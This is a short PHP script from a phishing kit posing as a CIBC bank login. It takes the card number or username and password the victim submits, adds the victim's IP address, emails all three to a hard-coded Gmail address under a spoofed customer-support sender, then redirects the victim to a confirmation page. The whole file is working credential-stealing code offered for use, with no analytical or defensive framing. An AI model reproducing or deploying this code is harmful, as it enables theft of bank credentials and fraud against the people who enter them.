<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------CIBC Info----------------------\n";
$message .= "Client Card/Username : ".$_POST['formtext1']."\n";
$message .= "Password : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY fudpages(dot)com-------------\n";
$send = "abdoalarg53@gmail.com";
$subject = "CIBC From $ip";
$headers = "From: CIBC Info<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
@mail($send,$subject,$message,$headers);
@mail($to,$subject,$message,$headers);
}
		   header("Location: confirm.php");

	 
?>